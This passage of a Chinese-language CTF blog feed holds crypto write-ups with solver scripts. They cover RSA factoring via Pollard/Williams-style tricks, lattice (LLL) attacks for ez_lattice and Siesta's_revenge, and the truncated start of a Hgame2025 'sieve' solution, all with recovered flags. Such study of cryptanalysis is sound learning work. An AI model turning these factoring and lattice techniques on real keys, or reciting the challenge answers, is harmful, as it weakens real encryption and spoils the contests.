class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> Matrix<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br>c1 = (<span class="hljs-number">6053032598894343876848386724367478876865502990878797490385487692233771017587839889683279773931697102081210221515871925626229356354906807395177342943323369</span>, <span class="hljs-number">4066195854081844630643812355140109730178549671457699640787009592379117222130777528564788537029636082768525403919530491221982157867347461546035515101540809</span>)<br>c2 = (<span class="hljs-number">3881600892538209342174115382004433032693183438455968854185245139152150453077746028435728337685187304179257593974737056409431270271087770400534952463611803</span>, <span class="hljs-number">3170419555737452151768856928448822332346045957475336562622244748908867061340721719260259808765271614258250388620180512676045609008728482012225062330421389</span>)<br>c3 = (<span class="hljs-number">12299016617136978588548772285625358530978334196485520160172325214608426825374255755330322407319092229940503630270734074076341447314630647646764214262929507</span>, <span class="hljs-number">318163940794629731124968470499655451861010987042419720693423620230895540439020747998494269609254222775880714679954773027280497632868550785421041286883861</span>)<br>c4 = (<span class="hljs-number">4549315768074822845197072475333248869579555413221208949230121240611191001190288208256119819724334902434536556333152862828649067092565476816480268615884657</span>, <span class="hljs-number">1882968780168858989700488482275734089425710600149658668167954773629584030303631176914870357507995175067079535271674721507969999430710585448040194277936142</span>)<br>e=<span class="hljs-number">65537</span><br>n1,n2,n3,n4=c1[<span class="hljs-number">0</span>],c2[<span class="hljs-number">0</span>],c3[<span class="hljs-number">0</span>],c4[<span class="hljs-number">0</span>]<br>enc1,enc2,enc3,enc4=c1[<span class="hljs-number">1</span>],c2[<span class="hljs-number">1</span>],c3[<span class="hljs-number">1</span>],c4[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#前半</span><br>p1=gmpy2.gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>*n2,n1)-<span class="hljs-number">1</span>,n1)<br>q1=n1//p1<br>p2=(p1-<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>q2=n2//p2<br>phi1=(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>phi2=(p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)<br>d1=gmpy2.invert(e,phi1)<br>d2=gmpy2.invert(e,phi2)<br>m1=<span class="hljs-built_in">pow</span>(enc1,d1,n1)<br>m2=<span class="hljs-built_in">pow</span>(enc2,d2,n2)<br><span class="hljs-comment">#print(m1,m2)</span><br>ans1=long_to_bytes(m1)[:<span class="hljs-number">11</span>]<br>ans2=long_to_bytes(m2)[:<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(ans1,ans2)<br><br><span class="hljs-comment">#后半</span><br><span class="hljs-comment">#矩阵快速幂</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">matrix_pow_mod</span>(<span class="hljs-params">matrix, exp, mod</span>):<br>    result = Matrix.eye(matrix.rows)  <span class="hljs-comment"># 单位矩阵</span><br>    base = matrix<br>    <span class="hljs-keyword">while</span> exp &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> exp % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            result = (result * base) % mod<br>        base = (base * base) % mod<br>        exp //= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment">#计算卢卡斯序列</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lucas_nth_mod</span>(<span class="hljs-params">n, P, m</span>):<br>    M = Matrix([[P, -<span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>]])      <span class="hljs-comment"># 转换为矩阵形式</span><br>    vec = Matrix([P, <span class="hljs-number">2</span>])               <span class="hljs-comment"># 初始向量 L1 = P, L0 = 2</span><br>    M_n = matrix_pow_mod(M, n, m)<br>    result = M_n * vec<br>    <span class="hljs-keyword">return</span> result[<span class="hljs-number">1</span>] % m<br><br>P = <span class="hljs-number">3</span>                                   <span class="hljs-comment">#要求为大于2的整数</span><br>n = n4*<span class="hljs-number">2</span><br>v_n = lucas_nth_mod(n, P, n3)        <span class="hljs-comment">#下标为n的卢卡斯序列</span><br><br>p3=gmpy2.gcd(<span class="hljs-built_in">int</span>(v_n)-<span class="hljs-number">2</span>,n3)<br>q3=n3//p3<br>p4=(p3+<span class="hljs-number">1</span>)//<span class="hljs-number">2</span><br>q4=n4//p4<br>phi3=(p3-<span class="hljs-number">1</span>)*(q3-<span class="hljs-number">1</span>)<br>phi4=(p4-<span class="hljs-number">1</span>)*(q4-<span class="hljs-number">1</span>)<br>d3=gmpy2.invert(e,phi3)<br>d4=gmpy2.invert(e,phi4)<br>m3=<span class="hljs-built_in">pow</span>(enc3,d3,n3)<br>m4=<span class="hljs-built_in">pow</span>(enc4,d4,n4)<br><span class="hljs-comment">#print(m3,m4)</span><br>ans3=long_to_bytes(m3)[:<span class="hljs-number">11</span>]<br>ans4=long_to_bytes(m4)[:<span class="hljs-number">11</span>]<br><span class="hljs-built_in">print</span>(ans3,ans4)<br><br><span class="hljs-built_in">print</span>(ans1+ans2+ans3+ans4)<br><span class="hljs-comment">#b&#x27;whuctf&#123;real&#x27; b&#x27;ly_sp3cia1_&#x27;</span><br><span class="hljs-comment">#b&#x27;P0llard_4nd&#x27; b&#x27;_w1ll1ams!&#125;&#x27;</span><br><span class="hljs-comment">#b&#x27;whuctf&#123;really_sp3cia1_P0llard_4nd_w1ll1ams!&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ez-lattice"><a href="#ez-lattice" class="headerlink" title="ez_lattice"></a>ez_lattice</h3><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br>blen = <span class="hljs-number">512</span><br><br>l = <span class="hljs-built_in">len</span>(flag) // <span class="hljs-number">4</span>                          <br>n = <span class="hljs-number">2</span><br>X = []<br>a = [bytes_to_long(flag[i * l: i * l + l]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]   <span class="hljs-comment">#前两个四分之一段分别转换成整数</span><br>b = <span class="hljs-number">0</span><br>p = getPrime(blen)                              <span class="hljs-comment">#512bit素数</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    X.append(getRandomNBitInteger(blen))        <span class="hljs-comment">#512bit整数</span><br>    b = (a[i] * X[i]) % p<br>    <span class="hljs-keyword">assert</span> b.bit_length() &lt; <span class="hljs-number">110</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><br><span class="hljs-comment"># p = 12478746590758967738992827236548867094406642228843048782158822830242432957850861746109083849369751421558416546441433265483311369062332823391326650330844473</span><br><span class="hljs-comment"># X = [4370703796271085517745653374714633557060694569231794372714420305839580193452505356598920188429238758568075323630107438853033389535935767953293146851021439, 5636765597544539887670148818611437395262628189014720546978418282055551396918915796702935478309173130501906553399905160951176701403838275497327658585404887]</span><br><br>n = <span class="hljs-number">2</span><br>X = []<br>a = [bytes_to_long(flag[i * l: i * l + l]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)]<br><span class="hljs-built_in">print</span>(a)<br>p = getPrime(blen)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    X.append(getRandomNBitInteger(blen))<br>    b = (a[i] * X[i]) % p<br>    <span class="hljs-keyword">assert</span> b.bit_length() &lt;= <span class="hljs-number">55</span><br><br>s = getRandomNBitInteger(<span class="hljs-number">55</span>)<br>P = p - s<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P =&quot;</span>, P)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><br><span class="hljs-comment"># P = 8064317391291915578249751043887298750752952396481901402238164933671762816998644264248732894561122039999833298392825353792148892469165631966482732750535761</span><br><span class="hljs-comment"># X = [6042201174605160506707043360458329015685676206288676104013330039569480295420873678739841513174948925787517746114885517054730046775608073287427260847787072, 6232867934334525782602291010514616748943593081406115516232887372014738839717093295759414233886061184914495957664550361507367497641317336980894814940037711]</span><br></code></pre></td></tr></table></figure><p><strong>参考：</strong> <a href="https://tover.xyz/p/wieners-lattices-equations/">Wiener’s v.s Lattices —— Ax≡y(mod P)的方程解法笔记 | Tover’s Blog</a></p><p><strong>分析：</strong> flag又被分成了两部分，感谢出题人总是先送我一半flag。</p><p><strong>part1:</strong> 非常常规的格，构造</p><span>$$(a[0],a[1],k)\begin{pmatrix}1 & 0 & X[0] \\0 & 1 & X[1] \\0 & 0 & p    \\\end{pmatrix}=(a[0],a[1],b_1+b_2)$$</span><p><strong>part2:</strong></p><p>参考了大佬博客之后才有思路，总之就是要把X[2],X[3]分开来讨论，构造格</p><p>AM&#x3D;B :</p><span>$$(k_1k_2,a_1k_2,a_2k_1,a_1a_2) \\\begin{pmatrix}1 & P & 0 & P^2 \\0 & X_1 & X_1 & X_1P \\0 & 0 & -X_2 & X_2P \\0 & 0 & 0 & X_1X_2\\ \end{pmatrix}\\=(k_1k_2,k_2(b_1-sk_1),b_1k_2-b_2k_1,(b_1-k_1s)(b_2-k_2s)$$</span><p>由于这个格并不满足<strong>Hermite定理</strong>，因此需要配平，配平系数可以参考大佬博客。</p><span>$$B \approx (P^{2\alpha},P^{2\alpha+\gamma},P^{\alpha+\beta},P^{2\alpha+2\gamma})\\\begin{pmatrix}P^{2\gamma} & 0 & 0 & 0\\0 & P^{\gamma} & 0 & 0 \\0 & 0 & P^{\alpha-\beta+2\gamma} & 0 \\0 & 0 & 0 & 1\\\end{pmatrix}$$</span><p>其中$\gamma&#x3D;\frac12,\alpha&#x3D;\frac{5}{14},\beta&#x3D;0$</p><p>求出矩阵B之后再乘上M的逆，从而得到矩阵A，再利用a中关系求出$a_1,a_2$</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment">#part1</span><br>p = <span class="hljs-number">12478746590758967738992827236548867094406642228843048782158822830242432957850861746109083849369751421558416546441433265483311369062332823391326650330844473</span><br>X = [<span class="hljs-number">4370703796271085517745653374714633557060694569231794372714420305839580193452505356598920188429238758568075323630107438853033389535935767953293146851021439</span>, <span class="hljs-number">5636765597544539887670148818611437395262628189014720546978418282055551396918915796702935478309173130501906553399905160951176701403838275497327658585404887</span>]<br><br>M = matrix(ZZ,[[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,X[<span class="hljs-number">0</span>]],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,X[<span class="hljs-number">1</span>]],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>a1=long_to_bytes(<span class="hljs-built_in">abs</span>(L[<span class="hljs-number">0</span>]))<br>a2=long_to_bytes(<span class="hljs-built_in">abs</span>(L[<span class="hljs-number">1</span>]))<br><span class="hljs-built_in">print</span>(a1,a2)<br><span class="hljs-comment">#b&#x27;whuctf&#123;&#x27; b&#x27;Lattice&#x27;</span><br><br><span class="hljs-comment">#part2</span><br>P = <span class="hljs-number">8064317391291915578249751043887298750752952396481901402238164933671762816998644264248732894561122039999833298392825353792148892469165631966482732750535761</span><br>X = [<span class="hljs-number">6042201174605160506707043360458329015685676206288676104013330039569480295420873678739841513174948925787517746114885517054730046775608073287427260847787072</span>, <span class="hljs-number">6232867934334525782602291010514616748943593081406115516232887372014738839717093295759414233886061184914495957664550361507367497641317336980894814940037711</span>]<br><br>x1,x2 = X<br>a=<span class="hljs-number">5</span>/<span class="hljs-number">14</span><br>M1=<span class="hljs-built_in">int</span>(P^<span class="hljs-number">0.5</span>)<br>M2=<span class="hljs-built_in">int</span>(P^(<span class="hljs-number">1</span>+a))<br><br>L2=Matrix(ZZ,[[P,   M1*P,       <span class="hljs-number">0</span>,    P^<span class="hljs-number">2</span>],<br>            [<span class="hljs-number">0</span>,    M1*x1,   M2*x1,   x1*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,  -M2*x2,   x2*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,       <span class="hljs-number">0</span>,  x1*x2]])<br>B=L2.LLL()[<span class="hljs-number">0</span>]<br>A=B*L2^(-<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#print(A)</span><br>a3=gcd(A[<span class="hljs-number">1</span>],A[<span class="hljs-number">3</span>])        <span class="hljs-comment">#因为没有保证a3,a4为素数，其实是k*a3，这里k刚好是1，否则可能需要爆破</span><br>a4=A[<span class="hljs-number">3</span>]//a3<br><span class="hljs-comment">#print(a3)</span><br><span class="hljs-comment">#print(a4)</span><br><span class="hljs-comment">#print(a3*a4)</span><br><br>a3=long_to_bytes(<span class="hljs-built_in">int</span>(a3))<br>a4=long_to_bytes(<span class="hljs-built_in">int</span>(a4))<br><span class="hljs-built_in">print</span>(a3,a4)<br><span class="hljs-built_in">print</span>(a1+a2+a3+a4)<br><span class="hljs-comment">#b&#x27;_1s_P0w&#x27; b&#x27;erFu1!&#125;&#x27;</span><br><span class="hljs-comment">#b&#x27;whuctf&#123;Lattice_1s_P0werFu1!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Siesta’s-revenge"><a href="#Siesta’s-revenge" class="headerlink" title="Siesta’s_revenge"></a>Siesta’s_revenge</h3><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br>flag = <span class="hljs-string">b&quot;whuctf&#123;&#125;&quot;</span><br>blen = <span class="hljs-number">512</span><br><br>p = getPrime(blen)<br>s = getRandomNBitInteger(<span class="hljs-number">100</span>)<br>P = p + s<br><br>t = <span class="hljs-number">2</span><br>X = []<br>a = [getPrime(<span class="hljs-number">160</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>    X.append(inverse(a[i], p))<br><br>key = sha256(<span class="hljs-built_in">str</span>(a[<span class="hljs-number">0</span>]*a[<span class="hljs-number">1</span>]).encode()).digest()[:<span class="hljs-number">16</span>]<br>iv = <span class="hljs-string">b&quot;0&quot;</span> * <span class="hljs-number">16</span><br>AES = AES.new(key, AES.MODE_CBC, iv)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;X =&quot;</span>, X)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P =&quot;</span>, P)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, AES.encrypt(pad(flag, AES.block_size)))<br><br><span class="hljs-comment"># X = [1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170, 10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991]</span><br><span class="hljs-comment"># P = 12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401</span><br><span class="hljs-comment"># ct = b&#x27;\xe9\x87\x942\xbc\x94`t\x85^r\xb8\xd2\x00\xfb\xb0Ni\x08\xcf\x07\xf1\xae\x95U&#123;\xf1\xd4\xda&#125;@H&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong> 怎么说呢，跟上题不能说十分类似吧，只能说一模一样，只是s变大了而已，但实践证明，它并没有影响我们格攻击成功。（所以说不理解出题人的预期效果是什么，希望能讲一讲）</p><p>那么攻击思路就同上</p><p><strong>解答：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><br>X = [<span class="hljs-number">1266403423628708294851978766647131186574350037928491893316575383770634141679199238688724846443316942748685589080912612989737322832820423142859211423222170</span>, <span class="hljs-number">10633805933378187507165706136587361125130747673943368523389315948924728188453225153073019422908293191827053741582511390426559341625596650317484672418362991</span>]<br>P = <span class="hljs-number">12727949469666331910572325155797935927989546075198211256583307434798528241134917675474139742863165705376701853130873014549089300596914514323642506815012401</span><br>ct = <span class="hljs-string">b&#x27;\xe9\x87\x942\xbc\x94`t\x85^r\xb8\xd2\x00\xfb\xb0Ni\x08\xcf\x07\xf1\xae\x95U&#123;\xf1\xd4\xda&#125;@H&#x27;</span><br><br>x1,x2 = X<br>a=<span class="hljs-number">5</span>/<span class="hljs-number">14</span><br>M1=<span class="hljs-built_in">int</span>(P^<span class="hljs-number">0.5</span>)<br>M2=<span class="hljs-built_in">int</span>(P^(<span class="hljs-number">1</span>+a))<br><br>L2=Matrix(ZZ,[[P,   M1*P,       <span class="hljs-number">0</span>,    P^<span class="hljs-number">2</span>],<br>            [<span class="hljs-number">0</span>,    M1*x1,   M2*x1,   x1*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,  -M2*x2,   x2*P],<br>            [<span class="hljs-number">0</span>,        <span class="hljs-number">0</span>,       <span class="hljs-number">0</span>,  x1*x2]])<br><br>B=L2.LLL()[<span class="hljs-number">0</span>]<br>A=B*L2^(-<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#print(A)</span><br>a=gcd(A[<span class="hljs-number">1</span>],A[<span class="hljs-number">3</span>])<br>b=gcd(A[<span class="hljs-number">2</span>],A[<span class="hljs-number">3</span>])<br>ans1=long_to_bytes(<span class="hljs-built_in">int</span>(a))<br>ans2=long_to_bytes(<span class="hljs-built_in">int</span>(b))<br><span class="hljs-comment">#print(ans1,ans2)</span><br><br>key = sha256(<span class="hljs-built_in">str</span>(a*b).encode()).digest()[:<span class="hljs-number">16</span>]<br>iv = <span class="hljs-string">b&quot;0&quot;</span> * <span class="hljs-number">16</span><br>AES = AES.new(key, AES.MODE_CBC, iv)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mt =&quot;</span>, AES.decrypt(ct))<br><span class="hljs-comment">#mt = b&#x27;whuctf&#123;You_w1ll_never_kn0w_1t!&#125;\x01&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>打ctf以来最有感觉的一场比赛，酣畅淋漓，也是燃尽了，感谢队友的带飞。</p><p>总结自己的做题量还是太少，对于很多原本应该一眼看出来的问题还是犹犹豫豫的，甚至不敢相信自己思路是对的，后来被hint拉回原本的思路才坚持做出正确结果。</p><p>因此日后还要加倍努力，争取不拖队友后腿！</p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2025 writeup</title>
    <link href="/2025/03/25/Hgame2025%20writeup/"/>
    <url>/2025/03/25/Hgame2025%20writeup/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2025-writeup（Crypto方向）"><a href="#Hgame2025-writeup（Crypto方向）" class="headerlink" title="Hgame2025 writeup（Crypto方向）"></a>Hgame2025 writeup（Crypto方向）</h1><h2 id="1-sieve"><a href="#1-sieve" class="headerlink" title="1.sieve"></a>1.sieve</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><br>FLAG = <span class="hljs-string">b&#x27;hgame&#123;xxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>m = bytes_to_long(FLAG)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trick</span>(<span class="hljs-params">k</span>):<br>    <span class="hljs-keyword">if</span> k &gt; <span class="hljs-number">1</span>:<br>        mul = prod(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,k))   <span class="hljs-comment">#阶乘</span><br>        <span class="hljs-keyword">if</span> k - mul % k - <span class="hljs-number">1</span> == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>) + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> euler_phi(k) + trick(k-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>p = q = nextprime(trick(e^<span class="hljs-number">2</span>//<span class="hljs-number">6</span>)&lt;&lt;<span class="hljs-number">128</span>)<br>n = p * q<br>enc = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;enc=&#125;</span>&#x27;</span>)<br><span class="hljs-comment">#enc=2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>分析并结合<strong>Wilson定理</strong>可知，我们要求的是从<code>1</code>到<code>e^2//6</code>的<strong>欧拉函数之和</strong>加上这之间的<strong>素数个数</strong>。</p><p>联系题目我们就可以联想到筛法，然后就是写脚本，这里求欧拉函数之和时python脚本运行时间过长，并且把电脑搞得非常卡，于是就改成了C++。</p><p><strong>解答</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">//(筛法求欧拉函数之和)</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">uint64_t</span> n = <span class="hljs-number">715849728</span>;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">uint64_t</span>&gt; <span class="hljs-title">phi</span><span class="hljs-params">(n + <span class="hljs-number">1</span>)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">uint64_t</span> i = <span class="hljs-number">0</span>; i &lt;= n; ++i) <br>    &#123;<br>        phi[i] = 